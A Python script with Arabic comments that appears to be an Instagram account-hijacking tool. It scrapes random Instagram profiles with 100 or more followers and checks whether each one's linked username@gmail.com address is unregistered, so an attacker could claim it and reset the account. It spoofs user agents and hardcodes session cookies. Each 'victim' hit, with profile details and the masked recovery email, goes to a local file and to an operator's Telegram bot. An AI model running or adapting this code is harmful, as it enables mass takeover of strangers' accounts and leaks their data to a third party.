import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from colorama import Fore, Style, init
init(autoreset=True)

# إعدادات الألوان
E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
Y = '\033[1;33m'
Z = '\033[1;31m'
A = '\033[2;34m'
C1 = '\x1b[38;5;120m'
HH = '\033[1;34m'
R = '\033[1;31;40m'

# متغيرات الإحصائيات
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

# إعدادات التطبيق
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
TOKEN_FILE = 'tl.txt'
DOMAIN = '@gmail.com'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'

# دالة إعداد البوت
def setup_bot():
    print(f'''{B}{E}=============================={B}
|{F}[+] Instagram Enhanced Tool  |
|{F}[+] Developer: @MRX_1wc      |
|{F}[+] Version: 2.0 Enhanced    |
{E}==============================''')
    
    global TOKEN, ID
    TOKEN = input(f'{F}({C}1{F}) {Y}Enter Bot Token: {Z}')
    print(Y + '═════════════════════════════════')
    ID = input(f'{F}({C}2{F}) {Y}Enter Chat ID: {Z}')
    print(Y + '═════════════════════════════════')

# دالة عرض الإحصائيات
def display_stats():
    global hits, bad_insta, bad_email, good_ig
    total_bad = bad_insta + bad_email
    print(f"\r{B}<| {C1}Hits: {M}{hits} {E}Bad: {HH}{M}{total_bad} {W9}Good IG: {M}{good_ig} {R}|>", end='')

# دالة تحديث الإحصائيات
def update_stats():
    display_stats()

# دالة إنشاء رمز Google
def create_google_token():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': str(generate_user_agent())
        }
        
        recovery_url = f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,"(.*?)",null,null,null,"(.*?)&', res1.text).group(2)
        
        cookies = {'__Host-GAPS': host}
        headers2 = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': GOOGLE_ACCOUNTS_URL,
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': generate_user_agent()
        }
        
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails", cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
            
    except Exception as e:
        print(f"Error creating Google token: {e}")
        create_google_token()

# دالة التحقق من Gmail
def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
            
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': GOOGLE_ACCOUNTS_URL,
            'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            'user-agent': generate_user_agent()
        }
        
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability", params=params, cookies=cookies, headers=headers, data=data)
        
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + DOMAIN
            username, domain = full_email.split('@')
            send_hit_info(username, domain)
        else:
            bad_email += 1
            update_stats()
            
    except Exception as e:
        bad_email += 1
        update_stats()

# دالة التحقق من Instagram
def check_instagram(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    device_id = 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    
    headers = {
        'user-agent': ua,
        'cookie': COOKIE_VALUE,
        'content-type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'signed_body': ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                       json.dumps({
                           '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                           'adid': uui,
                           'guid': uui,
                           'device_id': device_id,
                           'query': email
                       })),
        'ig_sig_key_version': '4'
    }
    
    try:
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
        
        if email in response:
            if DOMAIN in email:
                check_gmail(email)
            good_ig += 1
            update_stats()
        else:
            bad_insta += 1
            update_stats()
            
    except Exception:
        bad_insta += 1
        update_stats()

# دالة الحصول على معلومات الاسترداد
def get_reset_info(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'user-agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            'cookie': COOKIE_VALUE,
            'content-type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        
        data = {
            'signed_body': ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                           '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                           '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                           '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                           '"device_id":"android-b93ddb37e983481c",'
                           '"query":"' + user + '"}'),
            'ig_sig_key_version': '4'
        }
        
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
        return response.get('email', 'Reset None')
        
    except:
        return 'Reset None'

# دالة إرسال معلومات الضحية
def send_hit_info(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk', 'Unknown')
    full_name = account_info.get('full_name', 'Unknown')
    followers = account_info.get('follower_count', 0)
    following = account_info.get('following_count', 0)
    posts = account_info.get('media_count', 0)
    bio = account_info.get('biography', 'No Bio')
    total_hits += 1
    
    info_text = f"""
🎯 HIT ACCOUNT INSTAGRAM 
═══════════════════
🎯 Hits: {total_hits}
👤 Name: {username}
📧 Email: {username}@{domain}
👥 Followers: {followers}
👣 Following: {following}
📸 Posts: {posts}
📝 Bio: {bio}
🔄 Reset: {get_reset_info(username)}
🔗 URL: https://www.instagram.com/{username}
═══════════════════
🔧 Enhanced Tool by @MRX_1wc
═══════════════════
"""
    
    with open('enhanced_hits.txt', 'a', encoding='utf-8') as f:
        f.write(info_text + "\n")
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception:
        pass

# دالة مولد الأسماء المحسّنة
def enhanced_name_generator():
    while True:
        try:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(1629010000, 2500000000)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            
            headers = {
                'X-FB-LSD': data['lsd'],
                'user-agent': generate_user_agent()
            }
            
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            
            if username:
                followers = account.get('follower_count', 0)
                if followers < 100:  # فلترة الحسابات الصغيرة
                    continue
                    
                infoinsta[username] = account
                email = username + DOMAIN
                check_instagram(email)
                
        except Exception:
            continue

# دالة إحصائيات الوقت الفعلي
def stats_loop():
    while True:
        update_stats()
        time.sleep(1)

# دالة تشغيل السكربت الرئيسية
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    setup_bot()
    
    print(f"\n{F}[+] Creating Google token...{M}")
    create_google_token()
    
    print(f"{F}[+] Starting enhanced Instagram tool...{M}")
    print(f"{F}[+] Press Ctrl+C to stop{M}\n")
    
    # تشغيل إحصائيات الوقت الفعلي
    Thread(target=stats_loop, daemon=True).start()
    
    # تشغيل مولدات الأسماء المتعددة
    for _ in range(100):  # عدد الخيوط
        Thread(target=enhanced_name_generator, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Tool stopped by user{M}")
        print(f"{F}[+] Total hits: {hits}{M}")
        print(f"{F}[+] Check enhanced_hits.txt for results{M}")

if __name__ == "__main__":
    main()
